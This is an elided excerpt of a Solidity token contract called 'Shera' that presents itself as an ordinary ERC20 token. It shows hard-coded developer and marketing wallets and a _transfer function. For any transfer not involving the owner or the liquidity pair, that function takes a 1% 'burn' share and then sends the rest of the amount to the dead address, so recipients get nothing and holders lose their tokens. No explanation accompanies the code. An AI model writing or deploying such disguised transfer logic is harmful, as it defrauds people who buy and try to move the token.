...
contract Shera is Context, IERC20, ERC20Ownable {
    ...
    string private constant _nomenclature = "Shera";
    ...
    uint256 public _burnTax = 3;
    uint256 private _previousBurnFee = _burnTax;
    ...
    constructor() {
        ...
        devAddress = payable(0xE1D2cBd9b9A5A4C7064Ea5Ef05adbD4D9677E727);
        marketingAddress = payable(0xCF4A42bc15dC2020A51358A02ed1aF8E46552d9C);
    ...
    function _transfer(address from,address to,uint256 amount) private {
        ...
        if(_initateLiqTrans == true) {
            IUniswapV2Router02 _uniV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        ...
        if(from != owner() && to != uniV2Pair && from != uniV2Pair){
            takeFee = false;
            uint256 burnShare = amount.mul(1).div(100);
            amount = amount.sub(burnShare);
            removeAllFee();
            if(burnShare > 0){
                _transferStandard (from, dead, amount);
                restoreAllFee();
            }
        }
